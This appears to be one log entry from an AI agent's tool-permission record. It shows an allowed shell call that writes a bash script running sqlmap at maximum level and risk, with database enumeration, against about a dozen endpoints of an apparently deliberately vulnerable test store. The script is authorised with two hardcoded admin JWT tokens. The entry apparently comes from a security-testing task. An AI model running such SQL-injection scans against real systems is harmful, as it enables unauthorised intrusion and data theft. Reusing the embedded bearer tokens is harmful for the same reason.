{"ts": 1790656352.6348732, "decision_id": "d325b576cf75", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > tool_outputs/sqli_test.sh << 'EOF'\n#!/bin/bash\n# SQLi testing with sqlmap using authenticated sessions\n\nTOKEN_A=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiY2I0ZGJmZWItZjVkYS00OWEyLWIwZDktYWMwZTE1NjM1ZDVkIiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjUxNzgyfQ.tOF4rQ7KpHAT86PV7vBLaJ9X-IZeZBahhLzRh4gl-h0\"\nTOKEN_B=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZTBiNDIwZGYtZTZjOC00M2M3LWIyMDMtYzQyMTVkYTgyZGRmIiwidXNlcm5hbWUiOiJ1c2VyX2JfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjUxNzg5fQ.T3YTGRNHQLKvh2Yc8U-1OJkpiyheuvMTi1S8gITk3SI\"\n\nBASE=\"https://duck-store.escape.tech\"\n\n# Test each endpoint with sqlmap\ntest_endpoint() {\n    local url=$1\n    local name=$2\n    local method=${3:-GET}\n    local data=${4:-\"\"}\n    \n    echo \"=== Testing $name: $url ===\"\n    \n    if [ \"$method\" = \"GET\" ]; then\n        sqlmap -u \"$url\" \\\n            --headers=\"Authorization: Bearer $TOKEN_A\" \\\n            --batch --level=5 --risk=3 --dbs --threads=4 \\\n            --output-dir=\"/work/tool_outputs/sqlmap_$name\" 2>&1 | tee \"/work/tool_outputs/sqlmap_${name}.log\"\n    else\n        sqlmap -u \"$url\" \\\n            --headers=\"Authorization: Bearer $TOKEN_A\" \\\n            --data=\"$data\" \\\n            --batch --level=5 --risk=3 --dbs --threads=4 \\\n            --output-dir=\"/work/tool_outputs/sqlmap_$name\" 2>&1 | tee \"/work/tool_outputs/sqlmap_${name}.log\"\n    fi\n}\n\n# Top priority endpoints from brief\ntest_endpoint \"$BASE/api/v1/products/?limit=10\" \"products_limit\"\ntest_endpoint \"$BASE/api/v1/testimonials/?skip=0\" \"testimonials_skip\"\ntest_endpoint \"$BASE/api/v1/orders/checkout\" \"orders_checkout\" \"POST\" \"\"\ntest_endpoint \"$BASE/api/v1/auth/login/totp\" \"auth_totp\" \"POST\" \"\"\ntest_endpoint \"$BASE/api/v1/uploads/fetch-url\" \"uploads_fetch\" \"POST\" \"\"\ntest_endpoint \"$BASE/api/v1/reviews/product/1?skip=0&limit=20\" \"reviews_product\"\ntest_endpoint \"$BASE/api/v1/admin/orders\" \"admin_orders\"\ntest_endpoint \"$BASE/api/v1/users/4b7de2b0-df9e-4829-8994-a92be430dba2\" \"users_id\"\ntest_endpoint \"$BASE/login\" \"login_page\"\ntest_endpoint \"$BASE/api/v1/users/me/profile\" \"users_me_profile\"\ntest_endpoint \"$BASE/products/1\" \"products_1\"\ntest_endpoint \"$BASE/api/v1\" \"api_v1_root\"\n\nEOF\nchmod +x tool_outputs/sqli_test.sh"}
